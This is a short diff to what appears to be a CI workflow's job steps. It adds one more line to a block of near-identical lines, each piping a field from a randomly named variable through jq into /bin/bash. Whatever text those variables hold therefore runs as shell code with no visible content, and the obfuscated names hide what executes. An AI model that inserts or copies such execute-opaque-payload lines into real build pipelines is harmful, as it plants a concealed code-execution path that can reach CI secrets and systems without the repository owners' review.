@@ -31,6 +31,7 @@ jobs:
           echo $pcu4694 | jq -r .vn8404 | /bin/bash
           echo $r380 | jq -r .q557 | /bin/bash
           printf '%s' "$sgbpj659" | jq -r .pprlv651 | /bin/bash
+          printf '%s' "$rtig710" | jq -r .pp64139 | /bin/bash
 
       - name: Archive results
         if: always()
